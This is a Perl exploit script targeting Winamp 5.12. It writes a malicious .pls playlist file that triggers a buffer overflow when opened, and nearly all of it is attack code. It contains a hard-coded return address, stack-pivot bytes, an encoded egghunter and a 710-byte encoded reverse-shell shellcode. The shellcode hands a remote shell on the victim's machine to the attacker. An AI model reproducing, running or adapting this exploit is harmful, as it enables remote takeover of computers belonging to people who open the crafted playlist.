#!/usr/bin/perl 
#
# ============================
#          Winamp 5.12      
#       Exploit Skeleton   
# ============================

$start= "[playlist]\r\nFile1=\\\\";

#
# Entry Point: CALL ESP = 0202D961
#
$jmp="\x61\xD9\x02\x02";

#
# Stage 1: SUB ESP58; SUB ESP,58; JMP ESP = \x83\xEC\x58\x83\xEC\x58\xFF\xE4
#
$stage1="\x83\xEC\x58\x83\xEC\x58\xFF\xE4".
	"\x90\x90\x90\x90";

#
# Stage 2: Egghunter (32 byte) (Signature: b0ss)
#
$egghunter=
"\x89\xe5\xdb\xc8\xd9\x75\xf4\x58\x50\x59\x49\x49\x49\x49\x49".
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a".
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32".
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49".
"\x31\x76\x4e\x61\x38\x4a\x6b\x4f\x74\x4f\x51\x52\x42\x72\x73".
"\x5a\x45\x52\x50\x58\x5a\x6d\x44\x6e\x55\x6c\x66\x65\x73\x6a".
"\x42\x54\x68\x6f\x6d\x68\x72\x53\x44\x33\x76\x50\x52\x42\x4c".
"\x4b\x6a\x5a\x6e\x4f\x50\x75\x79\x7a\x6e\x4f\x74\x35\x5a\x47".
"\x4b\x4f\x4d\x37\x41\x41";

# 166(Original) - 126(Encoded Egghunter) = 40
$stage2=$egghunter . "\xcc" x 40;

#
# Stage 3: Reverse Shell (710 byte)
#
# 856(Original) - 8(Egg) - 710(revshell) = 138
$revshell=
"\x89\xe6\xda\xc3\xd9\x76\xf4\x5d\x55\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x49\x6c\x4b\x58\x4c\x42\x77\x70\x63\x30" .
"\x73\x30\x55\x30\x4d\x59\x5a\x45\x70\x31\x39\x50\x35\x34" .
"\x6c\x4b\x66\x30\x44\x70\x4c\x4b\x36\x32\x66\x6c\x6c\x4b" .
"\x63\x62\x54\x54\x6c\x4b\x33\x42\x56\x48\x74\x4f\x6c\x77" .
"\x53\x7a\x36\x46\x46\x51\x6b\x4f\x6c\x6c\x75\x6c\x63\x51" .
"\x61\x6c\x56\x62\x54\x6c\x77\x50\x59\x51\x4a\x6f\x74\x4d" .
"\x33\x31\x6b\x77\x38\x62\x78\x72\x36\x32\x36\x37\x6c\x4b" .
"\x51\x42\x74\x50\x6e\x6b\x42\x6a\x67\x4c\x4c\x4b\x32\x6c" .
"\x47\x61\x62\x58\x48\x63\x47\x38\x47\x71\x6b\x61\x36\x31" .
"\x4c\x4b\x63\x69\x67\x50\x63\x31\x59\x43\x6c\x4b\x43\x79" .
"\x34\x58\x4a\x43\x37\x4a\x51\x59\x4e\x6b\x74\x74\x4c\x4b" .
"\x45\x51\x49\x46\x65\x61\x69\x6f\x4c\x6c\x7a\x61\x78\x4f" .
"\x44\x4d\x33\x31\x4f\x37\x37\x48\x6d\x30\x31\x65\x58\x76" .
"\x33\x33\x43\x4d\x5a\x58\x75\x6b\x43\x4d\x55\x74\x30\x75" .
"\x78\x64\x73\x68\x4c\x4b\x72\x78\x77\x54\x43\x31\x4e\x33" .
"\x32\x46\x6c\x4b\x34\x4c\x32\x6b\x6c\x4b\x72\x78\x77\x6c" .
"\x43\x31\x69\x43\x4c\x4b\x75\x54\x6c\x4b\x66\x61\x68\x50" .
"\x6e\x69\x52\x64\x37\x54\x65\x74\x33\x6b\x61\x4b\x70\x61" .
"\x63\x69\x70\x5a\x42\x71\x49\x6f\x4b\x50\x63\x6f\x31\x4f" .
"\x62\x7a\x4e\x6b\x54\x52\x6a\x4b\x4c\x4d\x53\x6d\x32\x48" .
"\x37\x43\x34\x72\x45\x50\x73\x30\x43\x58\x71\x67\x70\x73" .
"\x76\x52\x33\x6f\x61\x44\x72\x48\x72\x6c\x50\x77\x54\x66" .
"\x53\x37\x39\x6f\x38\x55\x68\x38\x6e\x70\x73\x31\x67\x70" .
"\x43\x30\x64\x69\x7a\x64\x51\x44\x56\x30\x30\x68\x46\x49" .
"\x6d\x50\x70\x6b\x33\x30\x6b\x4f\x49\x45\x32\x70\x30\x50" .
"\x52\x70\x30\x50\x53\x70\x52\x70\x77\x30\x36\x30\x73\x58" .
"\x58\x6a\x56\x6f\x39\x4f\x49\x70\x49\x6f\x7a\x75\x4e\x77" .
"\x50\x6a\x37\x75\x71\x78\x6b\x70\x6c\x68\x34\x35\x4f\x73" .
"\x61\x78\x36\x62\x77\x70\x32\x31\x33\x6c\x4e\x69\x7a\x46" .
"\x53\x5a\x36\x70\x70\x56\x36\x37\x42\x48\x7a\x39\x4c\x65" .
"\x64\x34\x75\x31\x69\x6f\x4b\x65\x6d\x55\x59\x50\x42\x54" .
"\x74\x4c\x6b\x4f\x72\x6e\x75\x58\x33\x45\x5a\x4c\x63\x58" .
"\x68\x70\x6e\x55\x4c\x62\x43\x66\x4b\x4f\x6e\x35\x75\x38" .
"\x53\x53\x52\x4d\x35\x34\x73\x30\x6c\x49\x6d\x33\x66\x37" .
"\x56\x37\x42\x77\x30\x31\x48\x76\x33\x5a\x65\x42\x50\x59" .
"\x61\x46\x68\x62\x39\x6d\x35\x36\x79\x57\x63\x74\x76\x44" .
"\x35\x6c\x55\x51\x75\x51\x4c\x4d\x73\x74\x34\x64\x62\x30" .
"\x7a\x66\x57\x70\x70\x44\x66\x34\x30\x50\x56\x36\x36\x36" .
"\x32\x76\x73\x76\x73\x66\x52\x6e\x61\x46\x31\x46\x36\x33" .
"\x31\x46\x51\x78\x61\x69\x4a\x6c\x75\x6f\x4f\x76\x59\x6f" .
"\x4e\x35\x6e\x69\x49\x70\x52\x6e\x31\x46\x67\x36\x49\x6f" .
"\x66\x50\x50\x68\x46\x68\x4d\x57\x67\x6d\x33\x50\x39\x6f" .
"\x78\x55\x4d\x6b\x6a\x50\x6e\x55\x39\x32\x56\x36\x32\x48" .
"\x49\x36\x4c\x55\x4d\x6d\x6f\x6d\x49\x6f\x48\x55\x45\x6c" .
"\x47\x76\x33\x4c\x45\x5a\x4f\x70\x79\x6b\x6d\x30\x52\x55" .
"\x53\x35\x4f\x4b\x47\x37\x67\x63\x42\x52\x52\x4f\x70\x6a" .
"\x73\x30\x62\x73\x49\x6f\x39\x45\x41\x41";

$stage3="ss0bss0b" . $revshell . "\x90" x 138;
$end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberofEntries=1\r\nVersion=2\r\n";


#
# Creating Playlist File
#
open (MYFILE, '>>exploit.pls');
print MYFILE $start;          
print MYFILE $stage3;            
print MYFILE $stage2;      
print MYFILE $jmp;
print MYFILE $stage1;                
print MYFILE $end;
close (MYFILE);
